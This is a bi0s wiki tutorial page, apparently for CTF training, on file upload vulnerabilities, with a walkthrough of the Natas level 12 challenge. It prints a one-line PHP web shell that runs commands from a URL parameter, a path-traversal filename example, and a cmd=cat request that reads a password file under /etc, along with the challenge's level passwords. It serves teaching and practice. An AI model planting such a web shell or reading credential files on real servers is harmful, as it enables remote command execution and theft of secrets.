{% extends "bi0s_main.html" %}
{% block title %}
<title>File upload vulnerability - bi0s wiki</title>
{% endblock %}
{% block content %}
{% load static %}
<div class="md-sidebar md-sidebar--secondary" data-md-component="toc" style="height: 479px;" data-md-state="lock">
<div class="md-sidebar__scrollwrap">
<div class="md-sidebar__inner">
<nav class="md-nav md-nav--secondary">
<label class="md-nav__title" for="__toc">Table of contents</label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a href="#impact" title="Impact" class="md-nav__link" data-md-state="blur">
Impact
</a>
<nav class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a href="#explore-it-yourself" title="Explore it yourself :" class="md-nav__link" data-md-state="blur">
Explore it yourself :
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a href="#lets-try-a-challenge" title="Let's try a challenge" class="md-nav__link">
Let's try a challenge
</a>
</li>
</ul>
</nav>
</div>
</div>
</div>
<div class="md-content">
<article class="md-content__inner md-typeset">
<a href="https://gitlab.com/teambi0s/bi0s-wiki/blob/master/docs/web/file-upload.md" title="Edit this page" class="md-icon md-content__icon"></a><img name="kl_1567872464310" style="width: 12px; height: 12px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsSAAALEgHS3X78AAAB3ElEQVQ4jY2TPWhTURTH/+e8l7QNJg0qCJpCSdEnONTFDk5udfILs9mS6iJYpI4VnURXUcRJrFG3gm3tXLpIxaUUIVA/iLRJayQ2Nk1q7cu99zjUF/JhQv7jOff/O+fcwyERAQAQEaoVjsdOirgP93L+W5svJpeq8xVfPWD/yPkepekBWbjETl8nM0h9XtkRV72xLbmdn5hJ/xdw4OaVkC6U7oBwg6MRH0d7fGTbQDoLIYKUXa2/rO5C6SdWOHh/4/HrLQCwvZZUoZi2Dh/ysdPbRZ0dNeOQCMj2WXTiaMCUtsdUKn0dQHcNAEZCVr+DViJjYAW6/NqI34txS0eVIqEwRgfONMTbApyORDE3PIbF9dX2AKPHTyESCFbMExeGMTL9EguZVHuAxY3vmBscwtkjfS3NTQELuQzi72bwaGAQ8elEUzNQtQUiLsmf3X3eCt/n1uBMPQUy2bqSDCIuNXQgjHnJ5kzTUt47rUQY8w0AG2ZcLX/bkc2t5m5mlJdTv22Y8QZAPjGbBPHl8oePRb2yruu9BjBu8msRGrF8YjZZGb3+mA5ePee4ip9xoKOfj/UGSRuYtR/b+ldxyW/paz+fv/0EtLhGT91DF2NgubtXnu4VXk1N1vzFP99f037PUFbu4yIAAAAASUVORK5CYII=" width="12" height="12">
<h1 id="file-upload-vulnerability">File upload vulnerability<a class="headerlink" href="#file-upload-vulnerability" title="Permanent link">¶</a></h1>
<blockquote>
<p>Various web applications allow users to upload files (eg images, 
music files etc). The uploaded files can create momentous risk if not 
handled in a secure way. Depending on the how the file is processed and 
where it is stored the impact of the file upload vulnerability may vary.</p>
</blockquote>
<p>There are two types forms of complications here. The first one is 
with the metadata, like the path and the file name. These are generally 
provided by the transport, such as HTTP multipart encoding. This data 
can be used to trap the application into overwriting a critical file or 
storing the file in a bad location. For example, the attacker can upload
 a file called index.php in the root folder by upload a malicious file 
and its filename might look like this “../../../index.php”. So you must 
validate the metadata extremely carefully before using it. The other 
type of problem with uploaded data comes from file content.</p>
<h2 id="impact">Impact<a class="headerlink" href="#impact" title="Permanent link">¶</a></h2>
<ul>
<li>The attacker can get a web shell and execute various commands, browse system files and browse local resources etc.</li>
<li>Make a phishing page in the website</li>
<li>Make a permanent XSS in the website</li>
<li>Uploaded sensitive files might be accessible by unauthorized people.</li>
<li>Uploaded files might trigger vulnerabilities in broken libraries/applications on the client side.</li>
<li>Uploaded files might trigger vulnerabilities in broken libraries/applications on the server side.</li>
<li>Uploaded files might trigger vulnerabilities in broken real-time monitoring tools.</li>
</ul>
<p>The impact of this vulnerability is high, a supposed code can be 
executed in the server context or on the client side. The likelihood of 
detection for the attacker is high. The prevalence is common. As a 
result, the severity of this type of vulnerability is high.</p>
<h3 id="explore-it-yourself">Explore it yourself :<a class="headerlink" href="#explore-it-yourself" title="Permanent link">¶</a></h3>
<p>Make a PHP file to test the vulnerability locally in your system with the code mentioned here.</p>
<p>shell.php
</p><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite" id="__code_0"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_0 pre, #__code_0 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">echo</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"cmd"</span><span class="p">]);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
</td></tr></tbody></table><p></p>
<h2 id="lets-try-a-challenge">Let's try a challenge<a class="headerlink" href="#lets-try-a-challenge" title="Permanent link">¶</a></h2>
<p>NATAS 12 :
- USERNAME : natas12
- PASSWORD : EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 </p>
<p><img alt="natas12" src="{% static "bi0s_wiki/natas12.png" %}"></p>
<p>You can see that we can upload a file here. Let's try to upload a file so that we can get a shell on the website.</p>
<p>Make the shell.php file. We can pass the commands through the URL.</p>
<p>Now let's upload the PHP file. But during the upload, we should change the .jpeg format to .php by intercepting the request.</p>
<p><img alt="natas12" src="{% static "bi0s_wiki/natas12_004.png" %}"></p>
<p>Once you open the link generated by the site, we can start exploiting
 by giving the commands we desired. Once we get the shell we can do 
various things.</p>
<p>Let's try to find the files present in the directory where the image is uploaded by giving cmd=ls</p>
<p><img alt="natas12" src="{% static "bi0s_wiki/natas12_003.png" %}"></p>
<p>we can see various files present in the directory on the screen (say jpg,PHP etc.) uploaded by other users for the challenge.</p>
<p>The password for the next level will be in the folder /etc/natas_webpass/
where natas12 is the file containing the password.</p>
<p>so...
</p><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite" id="__code_1"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_1 pre, #__code_1 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="na">.php</span><span class="err">?</span><span class="no">cmd</span><span class="err">=</span><span class="no">cat</span>  <span class="err">/</span><span class="no">etc</span><span class="err">/</span><span class="no">natas_webpass</span><span class="err">/</span><span class="no">natas12</span>
</pre></div>
</td></tr></tbody></table><p></p>
<p>Gives the password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</p>
<p><img alt="natas12" src="{% static "bi0s_wiki/natas12_002.png" %}"></p>
<p>This is a basic example of File upload vulnerability.</p>
</article>
</div>
</div>
</main>
<footer class="md-footer">
<div class="md-footer-nav">
<nav class="md-footer-nav__inner md-grid">
<a href="/help/bi0s_wiki/web/cookies/" title="Cookies" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
<div class="md-flex__cell md-flex__cell--shrink">
</div>
<div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
<span class="md-flex__ellipsis">
<span class="md-footer-nav__direction">
Previous
</span>
Cookies
</span>
</div>
</a>
<a href="/help/bi0s_wiki/web/lfi/" title="Local File Inclusion" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
<div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
<span class="md-flex__ellipsis">
<span class="md-footer-nav__direction">
Next
</span>
Local File Inclusion
</span>
</div>
<div class="md-flex__cell md-flex__cell--shrink">
</div>
</a>
</nav>
</div>
{% endblock %}